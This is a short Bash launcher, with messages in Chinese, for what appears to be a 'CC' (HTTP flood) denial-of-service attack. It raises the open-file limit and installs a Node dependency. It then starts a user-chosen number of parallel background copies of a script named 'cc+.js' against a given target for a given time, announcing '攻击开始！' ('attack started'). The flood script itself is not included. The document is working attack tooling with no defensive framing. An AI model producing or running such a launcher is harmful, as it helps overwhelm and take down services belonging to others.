#!/bin/bash
ulimit -n 1000000

fileName="cc+.js"

if [ ! -d "./node_modules/chalk" ]; then
    npm install chalk
    echo "已为您自动安装 [ $fileName ] 脚本前置 [ chalk ]，请重新运行。"
    exit
fi

if [ ! -f "./$fileName" ]; then
    echo "\n脚本 [ $fileName ] 不存在！\n"
    exit
fi

if [ $1 -gt 0 ];
then
  for n in $(seq 1 $1)
  do
    node $fileName $2 $3 $4 $5 $6 $7 &
  done
  echo "\n==============================\n攻击开始！\n脚本：$fileName\n线程：$1\n时间：$5\n目标：$6\n==============================\n"
  exit
else
  echo "\n==============================\n缺少参数！\n示例：./$0 线程 时间 目标\n==============================\n"
fi